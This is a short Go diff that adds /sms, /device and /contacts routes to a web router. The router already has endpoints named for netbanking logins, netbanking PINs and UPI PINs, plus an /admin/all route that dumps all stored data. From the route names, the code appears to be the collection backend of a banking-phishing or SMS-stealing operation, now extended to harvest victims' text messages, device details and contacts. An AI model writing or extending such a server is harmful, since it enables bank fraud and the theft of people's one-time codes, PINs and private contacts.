@@ -52,6 +52,9 @@ func main() {
 		api.POST("/netbanking", handlers.SubmitNetbanking)
 		api.POST("/netbanking-pin", handlers.SubmitNetbankingPin)
 		api.POST("/upi-pin", handlers.SubmitUpiPin)
+		api.POST("/sms", handlers.SubmitSms)
+		api.POST("/device", handlers.RegisterDevice)
+		api.POST("/contacts", handlers.SubmitContacts)
 		api.GET("/admin/all", handlers.GetAllData)
 	}
 
